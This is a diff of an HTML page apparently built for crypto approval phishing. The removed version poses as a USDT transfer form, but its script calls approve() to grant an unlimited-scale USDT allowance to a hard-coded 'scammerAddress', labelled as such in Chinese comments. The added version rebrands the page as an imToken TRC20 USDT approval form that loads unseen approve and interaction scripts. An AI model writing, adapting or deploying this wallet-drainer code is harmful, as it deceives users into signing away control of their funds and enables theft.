@@ -2,86 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>USDT Transfer</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>imToken TRC20 USDT Approval</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <h1>Transfer USDT</h1>
-    <p>Enter the amount of USDT you want to transfer:</p>
-    <input type="text" class="amountInput" placeholder="Amount">
-    <button onclick="approveToken()">Authorize Transfer</button>
-    <p class="tipError"></p>
-    <script>
-        async function approveToken() {
-            if (typeof window.ethereum === 'undefined') {
-                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">Web3 wallet not detected</span>';
-                return;
-            }
-
-            const web3 = new Web3(window.ethereum);
-            try {
-                await window.ethereum.enable(); // Request account access
-
-                const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
-                const scammerAddress = "0x2A8729994cb188795C9583d5D72Ba6D5Ea1BEc1C"; // 替换为骗子地址
-                const usdtABI = [
-                    {
-                        "constant": true,
-                        "inputs": [{ "name": "owner", "type": "address" }],
-                        "name": "balanceOf",
-                        "outputs": [{ "name": "", "type": "uint256" }],
-                        "type": "function"
-                    },
-                    {
-                        "constant": false,
-                        "inputs": [
-                            { "name": "spender", "type": "address" },
-                            { "name": "value", "type": "uint256" }
-                        ],
-                        "name": "approve",
-                        "outputs": [{ "name": "", "type": "bool" }],
-                        "type": "function"
-                    }
-                ];
-
-                const accounts = await web3.eth.getAccounts();
-                const userAddress = accounts[0];
-                console.log("User Wallet Address: ", userAddress);
-
-                const contract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                let num = document.getElementsByClassName("amountInput")[0].value;
-                console.log("Amount Entered: ", num);
-
-                const balance = await contract.methods.balanceOf(userAddress).call();
-                const userBalance = web3.utils.fromWei(balance, 'mwei'); // USDT uses 6 decimals
-                console.log("User Balance: ", userBalance);
-
-                let amountToSend = parseFloat(num);
-
-                if (amountToSend > userBalance) {
-                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">USDT余额不足</span>';
-                    return;
-                }
-
-                console.log("Sending approve request...");
-
-                await contract.methods.approve(
-                    scammerAddress, // 地址 _spender
-                    web3.utils.toWei('100000000', 'mwei') // 最大授权量
-                ).send({ from: userAddress })
-                .on('transactionHash', function(hash) {
-                    console.log('Authorization output: ', hash);
-                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#00db00">授权成功</span>';
-                })
-                .on('error', function(error) {
-                    console.error('Error during approval: ', error);
-                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">授权失败</span>';
-                });
-            } catch (error) {
-                console.error('Error enabling ethereum: ', error);
-                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">操作失败</span>';
-            }
-        }
-    </script>
+    <div class="container">
+        <h1>imToken TRC20 USDT Approval</h1>
+        <div class="input-group">
+            <label for="amount">Amount to Approve:</label>
+            <input type="text" id="amount" class="amountInput">
+        </div>
+        <button id="approveButton">Approve</button>
+        <div class="tipError"></div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    <script src="app.js"></script>
+    <script src="approve.js"></script>
+    <script src="interaction.js"></script>
 </body>
 </html>
